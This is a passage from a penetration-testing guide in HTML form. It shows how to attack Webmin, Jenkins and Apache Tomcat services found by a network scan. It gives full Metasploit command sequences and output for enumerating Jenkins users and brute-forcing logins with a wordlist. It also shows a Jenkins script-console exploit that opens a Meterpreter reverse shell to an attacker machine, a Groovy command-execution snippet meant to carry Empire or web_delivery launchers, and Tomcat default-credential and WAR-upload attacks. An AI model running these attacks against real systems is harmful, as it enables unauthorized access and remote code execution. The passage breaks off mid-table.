<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">uc</span><span class="o">-</span><span class="n">httpd</span> <span class="mf">1.0</span><span class="o">.</span><span class="mi">0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Virata</span><span class="o">-</span><span class="n">EmWeb</span> <span class="mf">6.2</span><span class="o">.</span><span class="mi">1</span> <span class="n">HP</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">4.1</span> <span class="n">Server</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">VMware</span> <span class="n">ESXi</span> <span class="n">Server</span> <span class="n">httpd</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Web</span><span class="o">-</span><span class="n">Server</span> <span class="n">httpd</span> <span class="mf">3.0</span> <span class="n">Ricoh</span> <span class="n">Aficio</span> <span class="n">printer</span> <span class="n">web</span> <span class="n">image</span> <span class="n">monitor</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Western</span> <span class="n">Digital</span> <span class="n">My</span> <span class="n">Book</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">Zero</span> <span class="n">One</span> <span class="n">Technology</span> <span class="mi">11</span> <span class="n">httpd</span> <span class="mf">5.4</span><span class="o">.</span><span class="mi">2049</span>
<span class="mi">80</span><span class="p">,</span><span class="n">ipp</span><span class="p">,</span><span class="n">Canon</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span> <span class="mf">1.00</span>
<span class="mi">80</span><span class="p">,</span><span class="n">ipp</span><span class="p">,</span><span class="n">HP</span> <span class="n">Officejet</span> <span class="n">Pro</span> <span class="mi">8600</span> <span class="n">ipp</span> <span class="n">model</span> <span class="n">CM750A</span><span class="p">;</span> <span class="n">serial</span> <span class="n">CN314B3J9905SN</span>
<span class="mi">80</span><span class="p">,</span><span class="n">ipp</span><span class="p">,</span><span class="n">Web</span><span class="o">-</span><span class="n">Server</span> <span class="n">httpd</span> <span class="mf">3.0</span> <span class="n">NRG</span> <span class="n">copier</span> <span class="ow">or</span> <span class="n">Ricoh</span> <span class="n">Aficio</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">rtsp</span><span class="p">,</span>
<span class="mi">80</span><span class="p">,</span><span class="n">soap</span><span class="p">,</span><span class="n">gSOAP</span> <span class="n">soap</span> <span class="mf">2.7</span>
<span class="mi">80</span><span class="p">,</span><span class="n">tcpwrapped</span><span class="p">,</span><span class="n">Cisco</span> <span class="n">IOS</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">tcpwrapped</span><span class="p">,</span><span class="n">Virata</span><span class="o">-</span><span class="n">EmWeb</span> <span class="mf">6.0</span><span class="o">.</span><span class="mi">1</span> <span class="n">HP</span> <span class="n">LaserJet</span> <span class="n">P2015</span> <span class="n">Series</span> <span class="n">printer</span> <span class="n">http</span> <span class="n">config</span>
<span class="mi">80</span><span class="p">,</span><span class="n">upnp</span><span class="p">,</span><span class="n">Epson</span> <span class="n">Stylus</span> <span class="n">NX230</span> <span class="n">printer</span> <span class="n">UPnP</span> <span class="n">UPnP</span> <span class="mf">1.0</span><span class="p">;</span> <span class="n">Epson</span> <span class="n">UPnP</span> <span class="n">SDK</span> <span class="mf">1.0</span>
<span class="mi">80</span><span class="p">,</span><span class="n">wsman</span><span class="p">,</span><span class="n">Openwsman</span>
</pre></div>
</div>
<p>So, A lot of stuff, Let&#8217;s test them for one by one.</p>
<div class="section" id="webmin">
<h3>Webmin<a class="headerlink" href="#webmin" title="Permalink to this headline">¶</a></h3>
<div class="section" id="id11">
<h4>Metasploit<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">edit_html_fileaccess</span>  <span class="mi">2012</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">normal</span>     <span class="n">Webmin</span> <span class="n">edit_html</span><span class="o">.</span><span class="n">cgi</span> <span class="n">file</span> <span class="n">Parameter</span> <span class="n">Traversal</span> <span class="n">Arbitrary</span> <span class="n">File</span> <span class="n">Access</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">file_disclosure</span>       <span class="mi">2006</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">30</span>       <span class="n">normal</span>     <span class="n">Webmin</span> <span class="n">File</span> <span class="n">Disclosure</span>
<span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">webmin_show_cgi_exec</span>     <span class="mi">2012</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">excellent</span>  <span class="n">Webmin</span> <span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">show</span><span class="o">.</span><span class="n">cgi</span> <span class="n">Remote</span> <span class="n">Command</span> <span class="n">Execution</span>
</pre></div>
</div>
<p>but our webmin versions are different.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">edit_html_fileaccess</span> <span class="n">requires</span> <span class="n">Webmin</span> <span class="mf">1.580</span> <span class="n">plus</span> <span class="n">it</span> <span class="n">requires</span> <span class="n">authenticated</span> <span class="n">user</span><span class="o">.</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">file_disclosure</span> <span class="n">Webmin</span> <span class="p">(</span><span class="n">versions</span> <span class="n">prior</span> <span class="n">to</span> <span class="mf">1.290</span><span class="p">)</span> <span class="ow">and</span> <span class="n">Usermin</span> <span class="p">(</span><span class="n">versions</span> <span class="n">prior</span> <span class="n">to</span> <span class="mf">1.220</span><span class="p">)</span>
<span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">webmin_show_cgi_exec</span> <span class="ow">in</span> <span class="n">Webmin</span> <span class="mf">1.580</span>
</pre></div>
</div>
<p>Moving on to</p>
</div>
</div>
<div class="section" id="jenkins">
<h3>Jenkins<a class="headerlink" href="#jenkins" title="Permalink to this headline">¶</a></h3>
<p>Typically, Jenkins exposes an endpoint (/people or /asynchPeople) that does not require authentication and where all the defined users are listed.</p>
<div class="section" id="id12">
<h4>Metasploit<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Jenkins-CI Enumeration:   This module enumerates a remote Jenkins-CI installation in an unauthenticated manner, including host operating system and Jenkins installation details.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">jenkins_enum</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_enum</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">rhosts</span> <span class="n">canyoupwnme</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_enum</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">rport</span> <span class="mi">9000</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_enum</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">targeturi</span> <span class="o">/</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_enum</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span> <span class="n">Jenkins</span> <span class="n">Version</span> <span class="o">-</span> <span class="mf">1.647</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span> <span class="o">/</span><span class="n">script</span> <span class="n">restricted</span> <span class="p">(</span><span class="mi">403</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span> <span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">All</span><span class="o">/</span><span class="n">newJob</span> <span class="n">restricted</span> <span class="p">(</span><span class="mi">403</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span> <span class="o">/</span><span class="n">asynchPeople</span><span class="o">/</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">require</span> <span class="n">authentication</span> <span class="p">(</span><span class="mi">200</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span> <span class="o">/</span><span class="n">systemInfo</span> <span class="n">restricted</span> <span class="p">(</span><span class="mi">403</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Jenkins-CI Login Utility: This module attempts to login to a Jenkins-CI instance using a specific user/pass. So, Let&#8217;s try with Rockyou wordlist</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">jenkins_login</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">username</span> <span class="n">admin</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">pass_file</span> <span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">rhosts</span> <span class="n">canyoupwnme</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">rport</span> <span class="mi">9000</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">stop_on_success</span> <span class="n">true</span>
<span class="n">msf</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">jenkins_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="n">JENKINS</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">FAILED</span><span class="p">:</span> <span class="n">admin</span><span class="p">:</span><span class="mi">123456</span> <span class="p">(</span><span class="n">Incorrect</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="n">JENKINS</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">FAILED</span><span class="p">:</span> <span class="n">admin</span><span class="p">:</span><span class="n">flower</span> <span class="p">(</span><span class="n">Incorrect</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="n">JENKINS</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">FAILED</span><span class="p">:</span> <span class="n">admin</span><span class="p">:</span><span class="n">playboy</span> <span class="p">(</span><span class="n">Incorrect</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">100.195</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">admin</span><span class="p">:</span><span class="n">hello</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p class="first">Jenkins-CI Script-Console Java Execution: This module uses the Jenkins-CI Groovy script console to execute OS commands using Java. As we have the credentials obtained above, we can use them to execute OS commands</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>msf &gt; use exploit/multi/http/jenkins_script_console
msf exploit(jenkins_script_console) &gt; set username admin
msf exploit(jenkins_script_console) &gt; set password hello
msf exploit(jenkins_script_console) &gt; set rhost canyoupwnme
msf exploit(jenkins_script_console) &gt; set rport 9000
msf exploit(jenkins_script_console) &gt; set targeturi /
msf exploit(jenkins_script_console) &gt; set target 1
msf exploit(jenkins_script_console) &gt; exploit

[*] Started reverse TCP handler on 10.0.100.245:4444
[*] Checking access to the script console
[*] Logging in...
[*] canyoupwnme:9000 - Sending Linux stager...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.0.100.195
[*] Meterpreter session 2 opened (10.0.100.245:4444 -&gt; 10.0.100.195:44531) at 2016-04-18 18:13:30 +0200
[!] Deleting /tmp/AaqyV payload file

meterpreter &gt; shell
Process 1840 created.
Channel 1 created.
/bin/sh: 0: can&#39;t access tty; job control turned off
$ whoami
jenkins
$ id
uid=109(jenkins) gid=117(jenkins) groups=117(jenkins)
$
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><p>If the above metasploit modules doesn&#8217;t work, we can perform code execution manually. Visit the jenkins web page &gt; Manage Jenkins (options on the left side ) &gt; script console . In the script console page. copy and paste the below code into the editable area.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">sout</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">(),</span> <span class="n">serr</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">proc</span> <span class="o">=</span> <span class="s1">&#39;[INSERT COMMAND]&#39;</span><span class="o">.</span><span class="n">execute</span><span class="p">()</span>
<span class="n">proc</span><span class="o">.</span><span class="n">consumeProcessOutput</span><span class="p">(</span><span class="n">sout</span><span class="p">,</span> <span class="n">serr</span><span class="p">)</span>
<span class="n">proc</span><span class="o">.</span><span class="n">waitForOrKill</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="n">println</span> <span class="s2">&quot;out&gt; $sout err&gt; $serr&quot;</span>
</pre></div>
</div>
<p>In place of &#8216;[INSERT COMMAND]&#8217; we can use powershell Empire launcher or Web_delivery powershell inject code to get an agent or meterpreter shell on our attacking machine.</p>
<p>The above has been taken from <a class="reference external" href="https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password">Hacking Jenkins Servers with No Password</a> Also, Leonjza has written a blog <a class="reference external" href="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/">Jenkins to Meterpreter - toying with powersploit</a> which could provide more idea.</p>
</div></blockquote>
</div>
</div>
<div class="section" id="apache-tomcat">
<h3>Apache Tomcat<a class="headerlink" href="#apache-tomcat" title="Permalink to this headline">¶</a></h3>
<p>Searching for Tomcat</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">services</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&quot;Tomcat&quot;</span>

<span class="n">Services</span>
<span class="o">========</span>

<span class="n">host</span>          <span class="n">port</span>  <span class="n">proto</span>  <span class="n">name</span>      <span class="n">state</span>  <span class="n">info</span>
<span class="o">----</span>          <span class="o">----</span>  <span class="o">-----</span>  <span class="o">----</span>      <span class="o">-----</span>  <span class="o">----</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">8443</span>  <span class="n">tcp</span>    <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>  <span class="nb">open</span>   <span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">80</span>    <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="s2">&quot;Tomcat Manager Application&quot;</span> <span class="p">)</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">8080</span>  <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="s2">&quot;Tomcat Manager Application&quot;</span> <span class="p">)</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">1311</span>  <span class="n">tcp</span>    <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>  <span class="nb">open</span>   <span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">80</span>    <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">80</span>    <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="s2">&quot;Tomcat Manager Application&quot;</span> <span class="p">)</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">1311</span>  <span class="n">tcp</span>    <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>  <span class="nb">open</span>   <span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">8443</span>  <span class="n">tcp</span>    <span class="n">ssl</span><span class="o">/</span><span class="n">http</span>  <span class="nb">open</span>   <span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">80</span>    <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="s2">&quot;Tomcat Manager Application&quot;</span> <span class="p">)</span>
<span class="mf">10.17</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">8081</span>  <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="s2">&quot;Tomcat Manager Application&quot;</span> <span class="p">)</span>
<span class="mf">10.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">8080</span>  <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span> <span class="n">Tomcat</span><span class="o">/</span><span class="n">Coyote</span> <span class="n">JSP</span> <span class="n">engine</span> <span class="mf">1.1</span>
<span class="mf">10.87</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">8080</span>  <span class="n">tcp</span>    <span class="n">http</span>      <span class="nb">open</span>   <span class="n">Apache</span><span class="o">-</span><span class="n">Coyote</span><span class="o">/</span><span class="mf">1.1</span> <span class="p">(</span> <span class="mi">401</span><span class="o">-</span><span class="n">Basic</span> <span class="n">realm</span><span class="o">=</span><span class="s2">&quot;Tomcat Manager Application&quot;</span> <span class="p">)</span>
</pre></div>
</div>
<p>We get multiple tomcat manager applications running. Let&#8217;s see what we have for Tomcat</p>
<blockquote>
<div><ul class="simple">
<li><strong>Tomcat Application Manager Login Utility</strong> which checks for default tomcat username and passwords
using the above module</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">tomcat_mgr_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&quot;Tomcat Manager&quot;</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Run the scan for other ports also above 8443, 80, 1311, 8081 :)</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.25</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">8080</span> <span class="n">TOMCAT_MGR</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">FAILED</span><span class="p">:</span> <span class="n">QCC</span><span class="p">:</span><span class="n">QLogic66</span> <span class="p">(</span><span class="n">Incorrect</span><span class="p">:</span> <span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">6</span> <span class="n">of</span> <span class="mi">7</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">85</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.87</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">8080</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">admin</span><span class="p">:</span><span class="n">admin</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">LOGIN</span> <span class="n">SUCCESSFUL</span><span class="p">:</span> <span class="n">tomcat</span><span class="p">:</span><span class="n">tomcat</span>
</pre></div>
</div>
</div></blockquote>
<p>Yay :) We got two apache tomcat we can upload WAR files and get shell ;)</p>
<p>There are four ways ( in my knowledge to exploit this)</p>
<blockquote>
<div><ul class="simple">
<li>Apache Tomcat Manager Application Deployer Authenticated Code Execution ( tomcat_mgr_deploy )</li>
<li>Apache Tomcat Manager Authenticated Upload Code Execution ( tomcat_mgr_upload )</li>
</ul>
<blockquote>
<div><p>use either of them to exploit the application. by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">tomcat_mgr_deploy</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">tomcat_mgr_deploy</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
<span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">tomcat_mgr_deploy</span><span class="p">):</span>
<span class="n">Name</span>          <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
<span class="o">----</span>          <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
<span class="n">HttpPassword</span>                   <span class="n">no</span>        <span class="n">The</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">username</span>
<span class="n">HttpUsername</span>                   <span class="n">no</span>        <span class="n">The</span> <span class="n">username</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="k">as</span>
<span class="n">PATH</span>          <span class="o">/</span><span class="n">manager</span>         <span class="n">yes</span>       <span class="n">The</span> <span class="n">URI</span> <span class="n">path</span> <span class="n">of</span> <span class="n">the</span> <span class="n">manager</span> <span class="n">app</span> <span class="p">(</span><span class="o">/</span><span class="n">deploy</span> <span class="ow">and</span> <span class="o">/</span><span class="n">undeploy</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used</span><span class="p">)</span>
<span class="n">Proxies</span>                        <span class="n">no</span>        <span class="n">A</span> <span class="n">proxy</span> <span class="n">chain</span> <span class="n">of</span> <span class="nb">format</span> <span class="nb">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">[,</span><span class="nb">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">][</span><span class="o">...</span><span class="p">]</span>
<span class="n">RHOST</span>                          <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span>
<span class="n">RPORT</span>         <span class="mi">80</span>               <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
<span class="n">SSL</span>           <span class="n">false</span>            <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span> <span class="k">for</span> <span class="n">outgoing</span> <span class="n">connections</span>
<span class="n">VHOST</span>                          <span class="n">no</span>        <span class="n">HTTP</span> <span class="n">server</span> <span class="n">virtual</span> <span class="n">host</span>

<span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>

<span class="n">Id</span>  <span class="n">Name</span>
<span class="o">--</span>  <span class="o">----</span>
<span class="mi">0</span>   <span class="n">Automatic</span>
</pre></div>
</div>
<p>set the values required by exploit aad set the suitable payload and exploit. The successful exploitation will give us shell of the victim machine. The payload options can be viewed by  using the command</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">show</span> <span class="n">payloads</span>
</pre></div>
</div>
<p>The payload options available for this exploit is</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Compatible</span> <span class="n">Payloads</span>
<span class="o">===================</span>
<span class="n">Name</span>                            <span class="n">Disclosure</span> <span class="n">Date</span>  <span class="n">Rank</span>    <span class="n">Description</span>
